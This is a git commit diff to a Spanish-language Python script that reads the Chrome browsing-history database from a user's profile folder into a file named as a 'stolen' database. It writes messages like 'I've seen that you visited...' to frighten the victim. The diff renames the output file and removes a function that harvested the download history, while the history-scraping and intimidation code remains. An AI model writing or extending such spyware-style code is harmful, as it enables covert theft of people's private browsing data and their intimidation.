b73172452ff9110086740dca385da223d2e5f044
Andreu Seguí <andreuseguisegura@gmail.com>
2022-07-27 16:11:35 +0200

    27-07-2022 historial_chrome_perfiles_tw_fb_yt... Borrado parte de downloads

--- historial_chrome_perfiles_tw_fb_yt....py
+++ historial_chrome_perfiles_tw_fb_yt....py
@@ -5,7 +5,7 @@ import sqlite3
 import pathlib
 
 
-NOMBRE_ARCHIVO = "db_robada_chrome.txt"
+NOMBRE_ARCHIVO = "db_robada_chrome_2.txt"
 
 
 def get_user_path():
@@ -28,33 +28,9 @@ def get_chrome_data(user_path):
             time.sleep(5)
 
 
-def get_chrome_downloads(user_path):
-    urls = None
-    while not urls:
-        try:
-            ch_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
-            con = sqlite3.connect(ch_history_path)
-            cursor = con.cursor()
-            cursor.execute("SELECT tab_url, mime_type, target_path, total_bytes FROM downloads ORDER BY id DESC")
-            urls = cursor.fetchall()
-            con.close()
-            return urls
-        except sqlite3.OperationalError:
-            print("La base de datos esta bloqueada, reintentando en 5 segundos")
-            time.sleep(5)
-
-
 def scare_user_with_urls(hacker_doc, chrome_history):
     for url in chrome_history[:5]:
         hacker_doc.write("He visto que has entrado en: {} | {}\n".format(url[0], url[1]))
-
-
-def scare_user_with_downloads(hacker_doc, chrome_history2):
-    hacker_doc.write("\n")
-    for url in chrome_history2[:5]:
-        hacker_doc.write("He visto que te has descargado una [{}] de la pagina web: [{}]\n"
-                         "y te lo has descargado en:[{}] y el archivo pesa [{} mb]\n"
-                         .format(url[1], url[0], url[2], (url[3] / 1024)))
 
 
 """def delay():
@@ -75,9 +51,7 @@ def main():
     """delay()"""
     hacker_doc = crear_archivo(user_path)
     chrome_history = get_chrome_data(user_path)
-    chrome_history2 = get_chrome_downloads(user_path)
     scare_user_with_urls(hacker_doc, chrome_history)
-    scare_user_with_downloads(hacker_doc, chrome_history2)
 
 
 if __name__ == "__main__":
